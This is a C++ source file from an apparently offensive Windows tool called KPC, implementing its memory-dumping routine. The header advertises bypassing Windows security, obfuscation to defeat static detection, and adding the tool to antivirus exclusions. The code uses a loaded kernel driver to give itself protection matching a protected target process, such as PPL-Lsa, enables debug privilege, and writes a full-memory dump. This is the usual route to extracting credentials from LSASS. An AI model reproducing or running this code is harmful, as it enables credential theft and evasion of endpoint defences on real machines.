/*******************************************************************************
				██  ██ ██████  ████ 
				██ ██  ██  ██ ██    
				████   ██████ ██    
				██ ██  ██     ██    
				██  ██ ██      ████ 

  KPC - Kernel Process Control
  Advanced Windows Process Protection and Memory Dumping Tool
  Features Dynamic Kernel Driver Loading with Automatic Cleanup
  Achieves TrustedInstaller-level access bypassing Windows security restrictions

  -----------------------------------------------------------------------------
  Author : Marek Wesołowski
  Email  : marek@wesolowski.eu.org
  Phone  : +48 607 440 283 (Tel/WhatsApp)
  Date   : 04-09-2025

  -----------------------------------------------------------------------------
  License:
    KPC Custom License 1.0
    - Free for personal, non-commercial and academic use
    - A commercial license is required for business, enterprise or
      revenue-generating activities
    - Redistribution of source code allowed only with this header intact
    - The XOR decryption key for embedded drivers is not provided

  -----------------------------------------------------------------------------
DISCLAIMER:
    This software operates at Windows kernel level with elevated privileges.
    While designed to be safe, conflicts with antivirus software may cause
    system instability or BSOD. For optimal operation, add kpc.exe to your
    security software's exclusion list for both files and processes.
    
    The tool employs advanced anti-analysis techniques including XOR-based 
    string obfuscation, dynamic API loading, and runtime decryption to prevent
    static detection. All critical elements are reconstructed in memory only
    when needed, ensuring minimal security solution interference.
    
    Use responsibly. Author assumes no liability for system conflicts or misuse.

*******************************************************************************/

#include "Controller.h"
#include "common.h"
#include "Utils.h"
#include <DbgHelp.h>

extern volatile bool g_interrupted;

// ======================= Memory Dumping Operations (Atomic) =======================

bool Controller::DumpProcess(DWORD pid, const std::wstring& outputPath) noexcept {
    return CreateMiniDump(pid, outputPath);
}

bool Controller::DumpProcessByName(const std::wstring& processName, const std::wstring& outputPath) noexcept {
    // Atomic operation for name resolution
    if (!PerformAtomicInitWithErrorCleanup()) {
        return false;
    }
    
    auto matches = FindProcessesByName(processName);
    
    if (matches.empty()) {
        ERROR(OBFERR(L"No process found matching pattern: %s").c_str(), processName.c_str());
        PerformAtomicCleanup();
        return false;
    }
    
    if (matches.size() > 1) {
        ERROR(OBFERR(L"Multiple processes found matching pattern '%s'. Please use a more specific name:").c_str(), processName.c_str());
        for (const auto& match : matches) {
            std::wcout << OBFINFO(L"  PID ") << match.Pid << OBFINFO(L": ") << match.ProcessName << L"\n";
        }
        PerformAtomicCleanup();
        return false;
    }
    
    auto match = matches[0];
    INFO(OBFINFO(L"Found process: %s (PID %d)").c_str(), match.ProcessName.c_str(), match.Pid);
    
    // Clean up driver before CreateMiniDump (which will load it atomically)
    PerformAtomicCleanup();
    
    return CreateMiniDump(match.Pid, outputPath);
}

// ======================= Memory Dump Creation (Atomic) =======================

bool Controller::CreateMiniDump(DWORD pid, const std::wstring& outputPath) noexcept {
    // Atomic operation: cleanup → load → execute → cleanup
    if (!PerformAtomicInit()) {
        return false;
    }
    
    // Early interruption check before resource allocation
    if (g_interrupted) {
        INFO(OBFINFO(L"Operation cancelled by user before start").c_str());
        PerformAtomicCleanup();
        return false;
    }
    
    std::wstring processName = Utils::GetProcessName(pid);

    // Check for system processes that cannot be dumped
    auto systemProcess = OBFPROC(L"System");
    if (pid == 4 || processName == systemProcess) {
        ERROR(OBFERR(L"Cannot dump System process (PID %d) - Windows kernel process, undumpable by design").c_str(), pid);
        PerformAtomicCleanup();
        return false;
    }

    auto secureSystemProcess = OBFPROC(L"Secure System");
    if (pid == 188 || processName == secureSystemProcess) {
        ERROR(OBFERR(L"Cannot dump Secure System process (PID %d) - VSM/VBS protected process, undumpable").c_str(), pid);
        PerformAtomicCleanup();
        return false;
    }

    auto registryProcess = OBFPROC(L"Registry");
    if (pid == 232 || processName == registryProcess) {
        ERROR(OBFERR(L"Cannot dump Registry process (PID %d) - kernel registry subsystem, undumpable").c_str(), pid);
        PerformAtomicCleanup();
        return false;
    }

    auto memoryCompressionProcess = OBFPROC(L"Memory Compression");
    if (processName == memoryCompressionProcess || pid == 3052) {
        ERROR(OBFERR(L"Cannot dump Memory Compression process (PID %d) - kernel memory manager, undumpable").c_str(), pid);
        PerformAtomicCleanup();
        return false;
    }

    // Warn about low PID processes
    if (pid < 100 && pid != 0) {
        INFO(OBFINFO(L"Warning: Attempting to dump low PID process (%d: %s) - may fail due to system-level protection").c_str(), 
             pid, processName.c_str());
    }

    // Check interruption after validation
    if (g_interrupted) {
        INFO(OBFINFO(L"Operation cancelled by user during validation").c_str());
        PerformAtomicCleanup();
        return false;
    }

    // Get kernel address and protection information
    auto kernelAddr = GetProcessKernelAddress(pid);
    if (!kernelAddr) {
        ERROR(OBFERR(L"Failed to get kernel address for target process").c_str());
        PerformAtomicCleanup();
        return false;
    }

    auto targetProtection = GetProcessProtection(kernelAddr.value());
    if (!targetProtection) {
        ERROR(OBFERR(L"Failed to get protection info for target process").c_str());
        PerformAtomicCleanup();
        return false;
    }

    // Check interruption before protection elevation
    if (g_interrupted) {
        INFO(OBFINFO(L"Operation cancelled by user before protection setup").c_str());
        PerformAtomicCleanup();
        return false;
    }

    // Elevate self-protection to match target if needed
    if (targetProtection.value() > 0) {
        UCHAR targetLevel = Utils::GetProtectionLevel(targetProtection.value());
        UCHAR targetSigner = Utils::GetSignerType(targetProtection.value());

        std::wstring levelStr = (targetLevel == static_cast<UCHAR>(PS_PROTECTED_TYPE::Protected)) ? OBFPATH(L"PP") : OBFPATH(L"PPL");
        std::wstring signerStr;

        switch (static_cast<PS_PROTECTED_SIGNER>(targetSigner)) {
            case PS_PROTECTED_SIGNER::Lsa: signerStr = OBFPATH(L"Lsa"); break;
            case PS_PROTECTED_SIGNER::WinTcb: signerStr = OBFPATH(L"WinTcb"); break;
            case PS_PROTECTED_SIGNER::WinSystem: signerStr = OBFPATH(L"WinSystem"); break;
            case PS_PROTECTED_SIGNER::Windows: signerStr = OBFPATH(L"Windows"); break;
            case PS_PROTECTED_SIGNER::Antimalware: signerStr = OBFPATH(L"Antimalware"); break;
            case PS_PROTECTED_SIGNER::Authenticode: signerStr = OBFPATH(L"Authenticode"); break;
            case PS_PROTECTED_SIGNER::CodeGen: signerStr = OBFPATH(L"CodeGen"); break;
            case PS_PROTECTED_SIGNER::App: signerStr = OBFPATH(L"App"); break;
            default: 
                ERROR(OBFERR(L"Unknown signer type for target process").c_str());
                PerformAtomicCleanup();
                return false;
        }

        INFO(OBFINFO(L"Target process protection: %s-%s").c_str(), levelStr.c_str(), signerStr.c_str());

        if (!SelfProtect(levelStr, signerStr)) {
            ERROR(OBFERR(L"Failed to set self protection to %s-%s").c_str(), levelStr.c_str(), signerStr.c_str());
        } else {
            SUCCESS(OBFSUCCESS(L"Set self protection to %s-%s").c_str(), levelStr.c_str(), signerStr.c_str());
        }
    } else {
        INFO(OBFINFO(L"Target process is not protected, no self-protection needed").c_str());
    }

    if (!EnableDebugPrivilege()) {
        ERROR(OBFERR(L"Failed to enable debug privilege").c_str());
    }

    // Check interruption before opening target process
    if (g_interrupted) {
        INFO(OBFINFO(L"Operation cancelled by user before process access").c_str());
        auto noneProtection = OBFPATH(L"none");
        SelfProtect(noneProtection, noneProtection); // Remove self-protection before cleanup
        PerformAtomicCleanup();
        return false;
    }

    // Open target process for memory access
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) {
        hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (!hProcess) {
            ERROR(OBFERR(L"Failed to open process (error: %d)").c_str(), GetLastError());
            PerformAtomicCleanup();
            return false;
        }
    }

    // Construct output file path
    std::wstring fullPath = outputPath;
    if (!outputPath.empty() && outputPath.back() != L'\\')
        fullPath += OBFPATH(L"\\");
    fullPath += processName + OBFPATH(L"_") + std::to_wstring(pid) + OBFPATH(L".dmp");

    // Create dump file
    HANDLE hFile = CreateFileW(fullPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        ERROR(OBFERR(L"Failed to create dump file (error: %d)").c_str(), GetLastError());
        CloseHandle(hProcess);
        PerformAtomicCleanup();
        return false;
    }

    // Configure comprehensive dump type
    MINIDUMP_TYPE dumpType = static_cast<MINIDUMP_TYPE>(
        MiniDumpWithFullMemory |
        MiniDumpWithHandleData |
        MiniDumpWithUnloadedModules |
        MiniDumpWithFullMemoryInfo |
        MiniDumpWithThreadInfo |
        MiniDumpWithTokenInformation
    );

    // Critical interruption check before long-running operation
    if (g_interrupted) {
        INFO(OBFINFO(L"Operation cancelled by user before dump creation").c_str());
        CloseHandle(hFile);
        CloseHandle(hProcess);
        DeleteFileW(fullPath.c_str()); // Remove incomplete file
        auto noneProtection = OBFPATH(L"none");
        SelfProtect(noneProtection, noneProtection); // Remove self-protection
        PerformAtomicCleanup();
        return false;
    }

    INFO(OBFINFO(L"Creating memory dump - this may take a while. Press Ctrl+C to cancel safely.").c_str());
    
    // Execute memory dump creation (can take minutes for large processes)
    BOOL result = MiniDumpWriteDump(hProcess, pid, hFile, dumpType, NULL, NULL, NULL);
    
    // Post-dump interruption check
    if (g_interrupted) {
        INFO(OBFINFO(L"Operation was cancelled during dump creation").c_str());
        CloseHandle(hFile);
        CloseHandle(hProcess);
        DeleteFileW(fullPath.c_str()); // Remove potentially corrupt file
        auto noneProtection = OBFPATH(L"none");
        SelfProtect(noneProtection, noneProtection);
        PerformAtomicCleanup();
        return false;
    }
    
    CloseHandle(hFile);
    CloseHandle(hProcess);

    // Handle dump creation errors
    if (!result) {
        DWORD error = GetLastError();
        switch (error) {
            case ERROR_TIMEOUT:
                ERROR(OBFERR(L"MiniDumpWriteDump timed out - process may be unresponsive or in critical section").c_str());
                break;
            case RPC_S_CALL_FAILED:
                ERROR(OBFERR(L"RPC call failed - process may be a kernel-mode or system-critical process").c_str());
                break;
            case ERROR_ACCESS_DENIED:
                ERROR(OBFERR(L"Access denied - insufficient privileges even with protection bypass").c_str());
                break;
            case ERROR_PARTIAL_COPY:
                ERROR(OBFERR(L"Partial copy - some memory regions could not be read").c_str());
                break;
            default:
                ERROR(OBFERR(L"MiniDumpWriteDump failed (error: %d / 0x%08x)").c_str(), error, error);
                break;
        }
        DeleteFileW(fullPath.c_str());
        auto noneProtection = OBFPATH(L"none");
        SelfProtect(noneProtection, noneProtection);
        PerformAtomicCleanup();
        return false;
    }

    SUCCESS(OBFSUCCESS(L"Memory dump created successfully: %s").c_str(), fullPath.c_str());
    
    // Remove self-protection before cleanup
    INFO(OBFINFO(L"Removing self-protection before cleanup...").c_str());
    auto noneProtection = OBFPATH(L"none");
    SelfProtect(noneProtection, noneProtection);
    
    // Final interruption check before cleanup
    if (g_interrupted) {
        INFO(OBFINFO(L"Operation completed but cleanup was interrupted").c_str());
        PerformAtomicCleanup();
        return true; // Dump was successful
    }
    
    // Immediate cleanup after operation
    PerformAtomicCleanup();
    
    return true;
}